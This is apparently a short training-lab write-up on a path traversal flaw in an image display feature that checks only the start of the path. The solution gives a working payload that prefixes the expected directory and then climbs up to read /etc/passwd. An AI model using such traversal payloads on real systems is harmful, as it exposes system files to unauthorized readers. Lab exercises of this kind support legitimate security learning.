# Lab 05: File path traversal, validation of start of path

## Overview:
- Level : PRACTITIONER
- path traversal vulnerability in the display of product images
- End goal: retrieve the contents of the /etc/passwd file.

## Solution:
- ../../../etc/passwd doesn't work
- /var/www/images/../../../etc/passwd
